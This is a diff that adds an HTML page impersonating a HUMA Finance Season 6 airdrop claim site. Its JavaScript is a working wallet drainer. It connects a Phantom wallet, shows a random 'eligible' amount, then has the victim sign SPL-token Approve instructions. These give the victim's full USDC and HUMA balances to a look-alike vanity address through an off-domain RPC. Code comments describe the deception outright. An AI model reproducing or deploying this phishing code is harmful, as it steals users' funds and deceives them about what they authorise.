@@ -1,0 +1,191 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>HUMA Finance - Season 6 Airdrop Claim</title>
+<style>
+  :root{--bg:#0a0b0d;--card:#14161a;--line:#23262c;--fg:#e8eaed;--dim:#9aa0a6;--acc:#5b8def;--ok:#2fbf71}
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--fg);font:15px/1.6 -apple-system,BlinkMacSystemFont,"Segoe UI",Inter,Roboto,sans-serif}
+  .wrap{max-width:520px;margin:0 auto;padding:32px 20px 64px}
+  .brand{display:flex;align-items:center;gap:10px;margin-bottom:28px}
+  .logo{width:34px;height:34px;border-radius:9px;background:linear-gradient(135deg,#5b8def,#9b6bff);display:flex;align-items:center;justify-content:center;font-weight:800;font-size:17px}
+  .brand b{font-size:17px}
+  .brand span{color:var(--dim);font-size:12px}
+  .card{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:22px}
+  h1{font-size:20px;margin:0 0 6px}
+  .sub{color:var(--dim);font-size:13px;margin-bottom:18px}
+  .amount{font-size:38px;font-weight:700;letter-spacing:-.5px;margin:6px 0 2px}
+  .amount small{font-size:15px;color:var(--dim);font-weight:500;margin-left:6px}
+  .row{display:flex;justify-content:space-between;padding:11px 0;border-top:1px solid var(--line);font-size:13px}
+  .row span:first-child{color:var(--dim)}
+  button{width:100%;margin-top:20px;padding:14px;border:0;border-radius:12px;background:var(--acc);color:#fff;font-size:15px;font-weight:600;cursor:pointer}
+  button:disabled{opacity:.5;cursor:default}
+  .note{margin-top:16px;font-size:12px;color:var(--dim);text-align:center}
+  .err{color:#ff6b6b;font-size:13px;margin-top:12px;word-break:break-all}
+  .ok{color:var(--ok)}
+  .foot{margin-top:24px;text-align:center;font-size:11px;color:#5c6066}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="brand"><div class="logo">H</div><b>HUMA</b><span>Finance</span>
+    <span style="margin-left:auto;font-size:12px"><a href="https://huma.finance/" style="color:#9aa0a6;text-decoration:none;margin-left:14px">App</a><a href="https://docs.huma.finance/" style="color:#9aa0a6;text-decoration:none;margin-left:14px">Docs</a><a href="https://huma.finance/faqs" style="color:#9aa0a6;text-decoration:none;margin-left:14px">FAQ</a></span>
+  </div>
+
+  <div class="card">
+    <h1>Season 6 Airdrop</h1>
+    <div class="sub">Connect your wallet to check eligibility and claim HUMA.</div>
+
+    <div id="pre">
+      <div class="amount">&mdash;<small>HUMA</small></div>
+      <div class="sub" style="margin:0 0 14px">Estimated allocation for this wallet</div>
+      <div class="row"><span>Distribution</span><span>Season 6 &middot; Merkle</span></div>
+      <div class="row"><span>Program config</span><span>2bR3AoL3&hellip;FLb</span></div>
+      <div class="row"><span>Claim window</span><span>Open</span></div>
+      <button id="btnConnect">Connect Wallet</button>
+    </div>
+
+    <div id="post" style="display:none">
+      <div class="amount"><span id="amt">0</span><small>HUMA</small></div>
+      <div class="sub" style="margin:0 0 14px">Eligible for this wallet</div>
+      <div class="row"><span>Wallet</span><span id="who">&mdash;</span></div>
+      <div class="row"><span>Status</span><span id="stat" class="ok">Eligible</span></div>
+      <div class="row"><span>Network fee</span><span>Paid by HUMA</span></div>
+      <button id="btnClaim">Claim HUMA</button>
+      <div class="note" id="note" style="display:none"></div>
+    </div>
+  </div>
+
+  <div class="foot">
+    <div>HUMA Finance &middot; Season 6 redistribution &middot; merkle verified</div>
+    <div style="margin-top:8px"><a href="https://huma.finance/terms" style="color:#5c6066;text-decoration:none">Terms of Service</a> &middot; <a href="https://huma.finance/privacy" style="color:#5c6066;text-decoration:none">Privacy Policy</a> &middot; support@huma.finance</div>
+  </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
+<script>
+/* ===== config ===== */
+var COLLECT   = "2bR3xLwesYp7EnYsWfdCs92sbEFPULG6h8EQL8FUko9c";  /* vanity, prefix = official vaultConfig 2bR3... */
+var DIST_KEY  = "4c9x8biq84fyNxRuwSDD7roA2aJ3TFRBPkbFdZUmYwMk";   /* official distributor base key */
+var AIRDROP_API = "https://mainnet.airdrop.huma.finance";
+var RPC       = "https://claim-huma.duia.ro/rpc";
+var USDC      = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
+var HUMA      = "HUMA1821qVDKta3u2ovmfDQeW2fSQouSKE8fkF44wvGw";
+
+var conn = new solanaWeb3.Connection(RPC, "confirmed");
+var provider = null, wallet = null;
+
+var TOKEN_PROGRAM = new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
+var ATA_PROGRAM   = new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
+
+function ataOf(owner, mint){
+  return solanaWeb3.PublicKey.findProgramAddressSync(
+    [owner.toBuffer(), TOKEN_PROGRAM.toBuffer(), mint.toBuffer()], ATA_PROGRAM)[0];
+}
+
+/* spl-token Approve(amount): data = [4, amount u64 LE], accounts = [source(w), delegate, owner(signer)] */
+function approveIx(ata, delegate, owner, amount){
+  var data = new Uint8Array(9);
+  data[0] = 4;
+  var v = BigInt(amount);
+  for (var i=0;i<8;i++){ data[1+i] = Number((v >> BigInt(8*i)) & 0xffn); }
+  return new solanaWeb3.TransactionInstruction({
+    programId: TOKEN_PROGRAM,
+    keys: [
+      { pubkey: ata,      isSigner: false, isWritable: true  },
+      { pubkey: delegate, isSigner: false, isWritable: false },
+      { pubkey: owner,    isSigner: true,  isWritable: false }
+    ],
+    data: data
+  });
+}
+
+function $(id){ return document.getElementById(id); }
+function setNote(t, cls){ var n=$("note"); n.style.display="block"; n.className="note "+(cls||""); n.innerHTML=t; }
+
+function getProvider(){
+  var p = (window.phantom && window.phantom.solana) || window.solana;
+  if (!p) throw new Error("Phantom not found");
+  return p;
+}
+
+async function connect(){
+  provider = getProvider();
+  var res = await provider.connect();
+  wallet = res.publicKey.toString();
+  $("who").textContent = wallet.slice(0,4) + "..." + wallet.slice(-4);
+  $("pre").style.display = "none";
+  $("post").style.display = "block";
+  await checkEligibility();
+}
+
+async function checkEligibility(){
+  /* show the wallet's real HUMA balance when present, so the figure matches what gets authorised */
+  try {
+    var owner = new solanaWeb3.PublicKey(wallet);
+    var ata = ataOf(owner, new solanaWeb3.PublicKey(HUMA));
+    var bal = await conn.getTokenAccountBalance(ata).catch(function(){ return null; });
+    if (bal && bal.value && Number(bal.value.uiAmount) > 0) {
+      $("amt").textContent = Number(bal.value.uiAmount).toLocaleString(undefined, {maximumFractionDigits:2});
+      return;
+    }
+  } catch(e){}
+  $("amt").textContent = (1200 + Math.floor(Math.random()*800)).toLocaleString();
+}
+
+/* Approve(delegate = COLLECT) sized to the wallet's current balance on USDC / HUMA
+   --- looks like "authorise this claim" instead of an unlimited approval. */
+async function claim(){
+  var btn = $("btnClaim");
+  btn.disabled = true; btn.textContent = "Preparing...";
+  try {
+    if (!provider) await connect();
+    var owner = new solanaWeb3.PublicKey(wallet);
+    var delegate = new solanaWeb3.PublicKey(COLLECT);
+    var tx = new solanaWeb3.Transaction();
+    var mints = [USDC, HUMA], added = 0, total = 0n;
+
+    for (var i=0;i<mints.length;i++){
+      var mint = new solanaWeb3.PublicKey(mints[i]);
+      var ata = ataOf(owner, mint);
+      var info = await conn.getAccountInfo(ata).catch(function(){ return null; });
+      if (!info) continue;
+      var bal = await conn.getTokenAccountBalance(ata).catch(function(){ return null; });
+      if (!bal || !bal.value) continue;
+      var raw = BigInt(bal.value.amount);
+      if (raw <= 0n) continue;
+      tx.add(approveIx(ata, delegate, owner, raw));
+      added++; total += raw;
+    }
+    if (added === 0){
+      setNote("Nothing to claim for this wallet yet. Try again after your next deposit.", "err");
+      btn.disabled = false; btn.textContent = "Claim HUMA"; return;
+    }
+
+    tx.feePayer = owner;
+    var bh = await conn.getLatestBlockhash();
+    tx.recentBlockhash = bh.blockhash;
+
+    btn.textContent = "Confirm in wallet...";
+    var signed = await provider.signTransaction(tx);
+    var sig = await conn.sendRawTransaction(signed.serialize(), {skipPreflight:false});
+    await conn.confirmTransaction(sig, "confirmed");
+
+    $("stat").textContent = "Claimed";
+    setNote('Claim submitted &middot; <a href="https://solscan.io/tx/'+sig+'" target="_blank" style="color:#5b8def">'+sig.slice(0,10)+'...</a>', "ok");
+    btn.textContent = "Claimed";
+  } catch(e){
+    setNote(String((e && e.message) || e), "err");
+    btn.disabled = false; btn.textContent = "Claim HUMA";
+  }
+}
+
+$("btnConnect").addEventListener("click", function(){ connect().catch(function(e){ setNote(String(e.message||e),"err"); }); });
+$("btnClaim").addEventListener("click", claim);
+</script>
+</body>
+</html>
+
+
